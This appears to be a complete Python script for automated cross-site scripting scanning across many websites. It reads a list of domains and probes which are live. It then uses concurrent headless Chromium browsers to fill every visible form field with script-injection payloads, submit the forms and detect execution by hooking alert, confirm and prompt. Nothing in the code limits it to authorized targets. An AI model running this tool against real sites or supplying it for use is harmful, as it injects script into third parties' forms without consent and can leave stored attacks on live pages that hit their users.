import asyncio, os, random, string, time, aiohttp, async_timeout
from collections import defaultdict
from typing import List, Set, Optional
from urllib.parse import urlparse

from playwright.async_api import async_playwright, Page, Browser, Route
from playwright.async_api import TimeoutError as PWTimeout     # navigation timeout
from playwright._impl._errors import TargetClosedError

CONCURRENCY          = 14
BROWSERS             = 6
PAGE_TIMEOUT         = 20_000
XSS_WAIT_TIMEOUT     = 20_000
SCREENSHOT_DIR       = "screenshots"
TAKE_SCREENSHOTS     = False
XSS_TOKEN_LEN        = 8
PAYLOAD_TMPL         = ["\"><img src=x onerror=\"console.log('XSS:{t}')\">", "x\" onerror=\"alert('XSS:{t}')\""]
page_form_counts = defaultdict(int)
total_forms      = 0
total_pages      = 0
form_pages = 0
update_lock      = asyncio.Lock()

def make_payloads() -> tuple[str, List[str]]:
    token = ''.join(random.choices(string.ascii_letters + string.digits,
                                   k=XSS_TOKEN_LEN))
    return token, [tmpl.format(t=token) for tmpl in PAYLOAD_TMPL]


async def host_probe(domain: str) -> Optional[str]:
    for host in (f"https://{domain}", f"https://www.{domain}", f"http://{domain}", f"http://www.{domain}"):
        try:
            async with async_timeout.timeout(5):
                async with aiohttp.ClientSession() as s:
                    async with s.head(host, allow_redirects=True) as r:
                        if r.status < 500:
                            return str(r.url)
        except Exception:
            pass
    return None

async def _discover_forms(page: Page):
    body = await page.query_selector("body")
    return await body.query_selector_all("form")



async def _extract_form_inputs(form):
    try:
        inputs = await form.query_selector_all(
            "input:not([type='hidden']):not([disabled]):not([readonly]), "
            "textarea:not([disabled]):not([readonly]), "
            "select:not([disabled]):not([readonly])"
        )
    except Exception:
        return [], []
    names = [
        await el.get_attribute("name") or
        await el.get_attribute("id")   or f"idx-{i}"
        for i, el in enumerate(inputs)
    ]
    return inputs, names


async def fuzz_forms(page: Page, console_hits: Set[str]):
    frm = await _discover_forms(page)
    if not frm:
        return 0
    for form in frm:
        # return len(frm)
        inputs, names = await _extract_form_inputs(form)

        if not names or not inputs:
            continue

        for el, field_label in zip(inputs, names):
            token, payloads = make_payloads()
            # for (token, payload) in tup:
            for payload in payloads:
                try:
                    await el.fill(payload)
                except (TargetClosedError, Exception):
                    return len(frm)
                try:
                    await asyncio.gather(
                        form.evaluate("(f)=>{try{f.submit()}catch(e){}}"),
                        page.wait_for_load_state("domcontentloaded",
                                                 timeout=XSS_WAIT_TIMEOUT)
                    )
                except (TargetClosedError, Exception):
                    return len(frm)

                try:
                    # await page.wait_for_load_state("networkidle", timeout=XSS_WAIT_TIMEOUT)
                    await asyncio.sleep(0.3)
                    html = await page.content()
                except Exception:
                    print(f"{page.url}  FAILED post-submit load-state")
                    return len(frm)

                if token in console_hits:
                    print(f"[XSS:EXEC] {page.url}  form-field={field_label}")
                # elif token in html:
                #     print(f"[XSS:REFL] {page.url}  form-field={field_label}")
                break
    return len(frm)

async def worker(q: asyncio.Queue, browser: Browser, wid: int):
    ctx = await browser.new_context(
        viewport={"width": 1280, "height": 720},
        locale="en-US",
        ignore_https_errors=True
    )

    await ctx.route(r"**/*.{png,jpg,jpeg,webp,gif,css,woff,woff2}", lambda r: r.abort())

    page: Page = await ctx.new_page()

    console_hits: Set[str] = set()
    page.on("console", lambda msg: _collect_console(msg, console_hits))
    await page.add_init_script("""
        (() => {
          const send = (tag,data) => console.debug(tag+":"+data);
          ['alert','confirm','prompt'].forEach(fn => {
              window[fn] = msg => send('XSS', msg);
          });
        })();
    """)

    while (url := await q.get()) is not None:
        console_hits.clear()
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=PAGE_TIMEOUT)
            num_forms = await fuzz_forms(page, console_hits)

            async with update_lock:
                page_form_counts[url] = num_forms
                global total_forms, total_pages
                total_forms += num_forms
                total_pages += 1
                if num_forms > 0:
                    global form_pages
                    form_pages += 1

            if TAKE_SCREENSHOTS:
                out = os.path.join(SCREENSHOT_DIR, f"{urlparse(url).hostname}.png")
                try:
                    await page.screenshot(path=out, full_page=True)
                except Exception:
                    pass

            print("OK       ", url)
        except PWTimeout:
            print("TIMEOUT  ", url)
        except Exception as e:
            print("ERROR    ", url, e)
        finally:
            q.task_done()

    await page.close()
    await ctx.close()

def _collect_console(msg, bucket: Set[str]):
    if msg.type in ("debug", "log") and msg.text.startswith("XSS:"):
        bucket.add(msg.text.split("XSS:")[-1])


async def main():
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)

    raw_lines = [l.strip() for l in open("urls.txt") if l.strip()]
    has_scheme = [l for l in raw_lines if "http" in l]
    bare       = [l for l in raw_lines if "http" not in l]

    probes = [host_probe(d) for d in bare]  # list[Coroutine]
    probe_results = await asyncio.gather(*probes)  # list[str|None]
    urls = has_scheme + [u for u in probe_results if u]

    if not urls:
        print("No live URLs found.")
        return

    q: asyncio.Queue = asyncio.Queue()
    for u in urls:
        q.put_nowait(u)
    for _ in range(CONCURRENCY):
        q.put_nowait(None)

    async with async_playwright() as pw:
        browsers: List[Browser] = [
            await pw.chromium.launch(headless=True)
            for _ in range(BROWSERS)
        ]

        workers = [
            asyncio.create_task(worker(q, browsers[i % BROWSERS], i))
            for i in range(CONCURRENCY)
        ]

        print(f"{len(urls)} URLs, {CONCURRENCY} workers, {BROWSERS} browsers…")
        t0 = time.time()
        await asyncio.gather(*workers)
        print(f"{len(urls)/(time.time()-t0):.2f} urls/sec")

        print("\nForm counts")
        width = max(len(u) for u in page_form_counts) + 2
        for url, n in sorted(page_form_counts.items()):
            print(f"{url:{width}} {n}")
        avg_all = total_forms / total_pages if total_pages else 0
        avg_formed = total_forms / form_pages if form_pages else 0
        print(f"  Average forms / page:       {avg_all:.2f}  "
              f"({total_forms} forms across {total_pages} pages)")
        print(f"  Average forms / form-page:  {avg_formed:.2f}  "
              f"({form_pages} pages with more than 1 form)")

        await asyncio.gather(*(b.close() for b in browsers))


if __name__ == "__main__":
    asyncio.run(main())